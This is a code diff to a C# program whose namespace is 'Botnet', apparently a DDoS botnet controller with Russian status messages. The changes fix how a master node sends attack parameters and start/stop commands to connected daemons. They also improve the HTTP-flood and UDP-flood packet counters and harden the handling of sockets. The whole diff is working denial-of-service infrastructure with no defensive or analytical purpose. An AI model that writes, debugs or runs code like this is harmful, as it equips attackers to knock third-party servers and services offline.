@@ -74,7 +74,7 @@ namespace Botnet
             Params.UdpFloodEnabled = Convert.ToBoolean(ParamsArray[6]);
             Params.RestrictedPool = new NetworkInstruments.AddressPool(new IPAddress(new byte[] { rest1[0], rest1[1], rest1[2], rest1[3] }), new IPAddress(new byte[] { rest2[0], rest2[1], rest2[2], rest2[3] }));
             byte[] httpmsg = new byte[ParamsArray.Length - 15];
-            Array.Copy(ParamsArray, httpmsg, httpmsg.Length);
+            Array.Copy(ParamsArray, 15, httpmsg, 0, httpmsg.Length);
             Params.HttpMsg = System.Text.Encoding.ASCII.GetString(httpmsg);
             return Params;
         }
@@ -102,9 +102,11 @@ namespace Botnet
         sealed private class Daemon
         {
             public TcpClient Client;
-            public Daemon(TcpClient handler)
+            public ControllerState state;
+            public Daemon(TcpClient handler, ControllerState curstate)
             {
                 Client = handler;
+                state = curstate;
             }
             public IPEndPoint RemoteIPEndPoint
             {
@@ -115,8 +117,16 @@ namespace Botnet
             }
             public override string ToString()
             {
-                IPEndPoint point = (IPEndPoint)(Client.Client.RemoteEndPoint);
-                return point.Address + " " + point.Port; // return state + ip + port
+                try
+                {
+                    IPEndPoint point = (IPEndPoint)(Client.Client.RemoteEndPoint);
+                    return point.Address + " " + point.Port; // return state + ip + port
+                }
+                catch (ObjectDisposedException)
+                {
+
+                    return "";
+                }
             }
         }
         private volatile ControllerState state;
@@ -165,7 +175,7 @@ namespace Botnet
         //private UdpClient Messenger;
         public delegate void CallBackFunct(string Message);
         public delegate void ChangeModeCallBack(bool mode);
-        public delegate void StatisticCallBack(int httpam, int udpam, int tothttp, int totudp);
+        public delegate void StatisticCallBack(UInt32 httpam, UInt32 udpam, UInt32 tothttp, UInt32 totudp);
         public delegate void ErrorCallBack(string message);
         private CallBackFunct UpdateData;
         private ChangeModeCallBack ChangeMode;
@@ -248,15 +258,14 @@ namespace Botnet
         {
             if (!mode)
             {
+                if (state == ControllerState.Attacking) Stop();
                 Close();
                 AttackIsAllowed = false;
                 state = ControllerState.Tuning;
                 HostClient = new TcpClient(MyPoint);
                 Thread ClientHandler = new Thread(new ParameterizedThreadStart(MaintaintHostConnection));
                 ClientHandler.Start(HostClient);
-
             }
-
         }
         private void InitServer()
         {
@@ -273,7 +282,7 @@ namespace Botnet
             {
                 Stop();
             }
-            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || (MasterPoint != null && !MasterPoint.Equals(Master)))
+            if ((al_port != CurrentPort) || (Adapter.Id != this.Adapter.Id) || ((MasterPoint != null) && (!MasterPoint.Equals(Master))) || ((MasterPoint == null) && (Master != null)))
             {
                 Close();
                 UpdateData("Инициализация клиентов");
@@ -321,7 +330,7 @@ namespace Botnet
                 if (index == -1)
                 {
                     Thread Handler = new Thread(new ParameterizedThreadStart(MaintainServerConnection));
-                    Daemons.Add(new Daemon(NewHost));
+                    Daemons.Add(new Daemon(NewHost, ControllerState.Suspending));
                     NetCounter.addDevice();
                     Handler.Start(NewHost);
                 }
@@ -347,8 +356,8 @@ namespace Botnet
                 if (Connection.Available >= 9)
                 {
                     Stream.Read(buffer, 0, 9);
-                    int Http = BitConverter.ToInt32(buffer, 1);
-                    int Udp = BitConverter.ToInt32(buffer, 5);
+                    UInt32 Http = BitConverter.ToUInt32(buffer, 1);
+                    UInt32 Udp = BitConverter.ToUInt32(buffer, 5);
                     NetCounter.addStat(index, Http, Udp);
                     ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter + NetCounter.getTotatHttp(), Core.UdpCounter + NetCounter.getTotalUdp());
                 }
@@ -361,11 +370,13 @@ namespace Botnet
         }
         private class Counter
         {
+            private UInt32 http;
+            private UInt32 udp;
             private class device
             {
-                public int http;
-                public int udp;
-                public device(int http, int udp)
+                public UInt32 http;
+                public UInt32 udp;
+                public device(UInt32 http, UInt32 udp)
                 {
                     this.http = http;
                     this.udp = udp;
@@ -384,41 +395,33 @@ namespace Botnet
             {
                 devices.Add(new device(0, 0));
             }
-            public void addStat(int ind, int http, int udp)
+            public void addStat(int ind, UInt32 http, UInt32 udp)
             {
-                devices[ind].http = http;
-                devices[ind].udp = udp;
+                devices[ind].http += http;
+                devices[ind].udp += udp;
+                this.http += http;
+                this.udp += udp;
             }
             public void removeDevice(int index)
             {
                 devices.RemoveAt(index);
             }
-            public int getDeviceHttp(int ind)
+            public UInt32 getDeviceHttp(int ind)
             {
                 return devices[ind].http;
             }
-            public int getDeviceUdp(int ind)
+            public UInt32 getDeviceUdp(int ind)
             {
                 return devices[ind].udp;
             }
-            public int getTotatHttp()
+            public UInt32 getTotatHttp()
             {
-                int tot = 0;
-                for (int i = 0; i < devices.Count; ++i)
-                {
-                    tot += devices[i].http;
-                }
-                return tot;
+                return http;
             }
 
-            public int getTotalUdp()
+            public UInt32 getTotalUdp()
             {
-                int tot = 0;
-                for (int i = 0; i < devices.Count; ++i)
-                {
-                    tot += devices[i].udp;
-                }
-                return tot;
+                return udp;
             }
         }
         private void MaintaintHostConnection(Object Params)
@@ -433,6 +436,10 @@ namespace Botnet
                 Connection.ReceiveTimeout = 100;
                 NetworkStream Stream = Connection.GetStream();
                 bool DataCollected;
+                UInt32 oldHttpCount = 0;
+                UInt32 oldUdpCount = 0;
+                UInt32 newHttpCount;
+                UInt32 newUdpCount;
                 while (Connection.Connected)
                 {
                     DataCollected = false;
@@ -475,8 +482,12 @@ namespace Botnet
                             case 3:
                                 List<byte> msgs = new List<byte>();
                                 msgs.Add(3);
-                                msgs.AddRange(BitConverter.GetBytes(Core.HttpCounter));
-                                msgs.AddRange(BitConverter.GetBytes(Core.UdpCounter));
+                                newHttpCount = Core.HttpCounter;
+                                newUdpCount = Core.UdpCounter;
+                                msgs.AddRange(BitConverter.GetBytes(newHttpCount - oldHttpCount));
+                                msgs.AddRange(BitConverter.GetBytes(newUdpCount - oldUdpCount));
+                                oldHttpCount = newHttpCount;
+                                oldUdpCount = newUdpCount;
                                 Stream.Write(msgs.ToArray(), 0, msgs.Count);
                                 //stats
                                 break;
@@ -536,7 +547,41 @@ namespace Botnet
            12 - ready for attack ack
            13 - master idle request
          */
+        private void SendStartSignal()
+        {
+            for (int i = 0; i < Daemons.Count; ++i)
+            {
+                if (Daemons[i].state == ControllerState.Suspending)
+                {
+                    Daemons[i].state = ControllerState.Attacking;
+                    SendServiceMessage(MessageCode.Params, Daemons[i].Client, Params.GetBytes());
+                    SendServiceMessage(MessageCode.StartAttack, Daemons[i].Client);
 
+                }
+            }
+        }
+        private void SendStopSignal()
+        {
+            for (int i = 0; i < Daemons.Count; ++i)
+            {
+                if (Daemons[i].state == ControllerState.Attacking)
+                {
+                    Daemons[i].state = ControllerState.Suspending;
+                    SendServiceMessage(MessageCode.StopAttack, Daemons[i].Client);
+
+                }
+            }
+        }
+        private void SendStatReqSignal()
+        {
+            for (int i = 0; i < Daemons.Count; ++i)
+            {
+                if (Daemons[i].state == ControllerState.Attacking)
+                {
+                    SendServiceMessage(MessageCode.StatisticMessageRequest, Daemons[i].Client);
+                }
+            }
+        }
         public void Start()
         {
             if ((state != ControllerState.Error) && (state != ControllerState.Tuning))
@@ -545,9 +590,8 @@ namespace Botnet
                 {
                     if (mode)
                     {
-                        SendServiceMessage(MessageCode.Params, Params.GetBytes());
-                        SendServiceMessage(MessageCode.StartAttack);
-                        UpdateData("Начало атаки на" + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
+                        SendStartSignal();
+                        UpdateData("Начало атаки на " + Core.Params.Target.Address.ToString() + ":" + Core.Params.Target.Port);
                         Core.start();
                         state = ControllerState.Attacking;
                     }
@@ -570,8 +614,8 @@ namespace Botnet
             }
             else
             {
-                UpdateData("Отсутсвует подключение к мастеру");  //oder not only to master
-                state = ControllerState.Suspending;
+                UpdateData("Отсутсвует подключение к мастеру");
+                state = ControllerState.Error;
             }
 
         }
@@ -585,7 +629,7 @@ namespace Botnet
                 UpdateData("Остановка атаки...");
                 if (mode)
                 {
-                    SendServiceMessage(MessageCode.StopAttack);
+                    SendStopSignal();
                 }
                 state = ControllerState.Suspending;
             }
@@ -594,9 +638,7 @@ namespace Botnet
                 UpdateData("Атака еще не запущена");
             }
         }
-
-        //UpdateData(); // check it
-        private void SendServiceMessage(MessageCode code, params byte[] payload)
+        private void SendServiceMessage(MessageCode code, TcpClient Recipinet, params byte[] payload)
         {
             List<byte> data = new List<byte>();
             data.Add((byte)code);
@@ -605,9 +647,12 @@ namespace Botnet
                 data.AddRange(BitConverter.GetBytes((UInt16)payload.Length));
                 data.AddRange(payload);
             }
-            for (int i = 0; i < Daemons.Count; ++i)
+            try
             {
-                Daemons[i].Client.GetStream().Write(data.ToArray(), 0, data.Count);
+                Recipinet.GetStream().Write(data.ToArray(), 0, data.Count);
+            }
+            catch (Exception)
+            {  //host has disconnected
             }
         }
 
@@ -630,8 +675,8 @@ namespace Botnet
             {
                 if (Daemons.Count != 0)
                 {
-                    SendServiceMessage(MessageCode.StatisticMessageRequest);
-                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, NetCounter.getTotatHttp(), NetCounter.getTotalUdp());
+                    SendStatReqSignal();
+                    //ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, NetCounter.getTotatHttp(), NetCounter.getTotalUdp());
                 }
                 else
                 {
@@ -664,7 +709,14 @@ namespace Botnet
                 {
                     for (int i = 0; i < Daemons.Count; ++i)
                     {
-                        Daemons[i].Client.Close();
+                        if (Daemons[i].Client != null)
+                        {
+                            if ((Daemons[i].Client.Client != null) && (Daemons[i].Client.Connected))
+                            {
+                                Daemons[i].Client.GetStream().Close();
+                            }
+                            Daemons[i].Client.Close();
+                        }
                     }
                     Server.Stop();
                 }
@@ -673,6 +725,10 @@ namespace Botnet
             {
                 if (HostClient != null)
                 {
+                    if ((HostClient.Client != null) && (HostClient.Connected))
+                    {
+                        HostClient.GetStream().Close();
+                    }
                     HostClient.Close();
                 }
             }
@@ -685,8 +741,8 @@ namespace Botnet
         private Random Randomizer = new Random();
         private TcpClient Client;
         private volatile bool Attacking;
-        private volatile int udpCounter;
-        private volatile int httpCounter;
+        private volatile UInt32 udpCounter;
+        private volatile UInt32 httpCounter;
         private int TryConnectAm;
         public volatile NetworkInterface Adapter;
         public AttackParams Params;
@@ -704,6 +760,7 @@ namespace Botnet
         {
             Client = new TcpClient(new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), 0));
             Client.ReceiveBufferSize = 1514;
+            Client.ReceiveTimeout = 3000;
         }
         private void processHttpFlood(Object Params)
         {
@@ -805,14 +862,14 @@ namespace Botnet
                 }
             }
         }
-        public int HttpCounter
+        public UInt32 HttpCounter
         {
             get
             {
                 return httpCounter;
             }
         } //perpahs use counter of sent packets?
-        public int UdpCounter
+        public UInt32 UdpCounter
         {
             get
             {
